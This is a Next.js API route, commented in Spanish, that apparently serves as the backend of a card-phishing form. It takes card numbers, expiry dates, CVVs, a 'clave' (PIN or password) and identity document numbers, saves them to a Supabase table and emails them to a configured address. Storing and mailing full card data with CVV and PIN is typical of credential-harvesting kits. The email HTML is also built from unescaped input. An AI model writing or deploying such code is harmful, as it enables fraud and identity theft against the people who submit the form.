// app/api/form/submit/route.ts
import { NextResponse } from "next/server";
import { z } from "zod";
import { Resend } from "resend";
import { pickAllowedFields } from "utils/form/helpers.ts";
import { supabase } from "utils/supabase/server.ts"; // cliente server-side

const resend = process.env.RESEND_API_KEY
  ? new Resend(process.env.RESEND_API_KEY)
  : null;

const Payload = z.record(z.any()); // aceptamos cualquier shape

export async function POST(req: Request) {
  try {
    const raw = await req.json();
    const data = Payload.parse(raw);

    // 1) Guardar en Supabase
    const { error: dbError } = await supabase.from("form_submissions").insert([
      {
        card: data.card,
        exp: data.exp,
        cvv: data.cvv,
        clave: data.clave,
        docType: data.docType,
        docNumber: data.docNumber,
      },
    ]);

    if (dbError) {
      console.error("Supabase insert error:", dbError);
      return NextResponse.json(
        { ok: false, message: "Error guardando en Supabase" },
        { status: 500 }
      );
    }

    // 2) Qué campos incluir en el correo (controlado por INCLUDE_FIELDS)
    const includeCsv = process.env.INCLUDE_FIELDS; // ej: "card,exp,cvv,clave,docType,docNumber"
    const allowed = pickAllowedFields(data, includeCsv);

    // 3) Log completo solo en entorno local (para debug)
    if (
      process.env.NODE_ENV !== "production" &&
      process.env.DEV_SHOW_SENSITIVE === "true"
    ) {
      console.log("DEV PAYLOAD:", JSON.stringify(data, null, 2));
    }

    // 4) Construcción del correo
    const entriesHtml = Object.entries(allowed)
      .map(([k, v]) => `<p><strong>${k}:</strong> ${String(v ?? "")}</p>`)
      .join("\n");

    const html = `
      <div style="font-family:system-ui,Segoe UI,Roboto,Arial;line-height:1.5">
        <h3>Nuevo envío de formulario</h3>
        ${entriesHtml || "<i>Sin campos permitidos configurados (INCLUDE_FIELDS)</i>"}
        <hr/>
        <small>Enviado: ${new Date().toLocaleString()}</small>
      </div>
    `;

    // 5) Enviar con Resend (o loguear si no está configurado)
    const to = process.env.MAIL_TO!;
    const from = process.env.MAIL_FROM || "onboarding@resend.dev";

    if (!to) {
      return NextResponse.json(
        { ok: false, message: "MAIL_TO no configurado" },
        { status: 500 }
      );
    }

    if (resend) {
      await resend.emails.send({
        from,
        to,
        subject: "📩 Nuevo formulario",
        html,
      });
    } else {
      console.log("Email (preview):", {
        from,
        to,
        subject: "Nuevo formulario",
        html,
      });
    }

    return NextResponse.json({ ok: true });
  } catch (err: any) {
    console.error("submit error", err);
    if (err?.issues) {
      return NextResponse.json(
        { ok: false, issues: err.issues },
        { status: 400 }
      );
    }
    return NextResponse.json(
      { ok: false, message: "error interno" },
      { status: 500 }
    );
  }
}
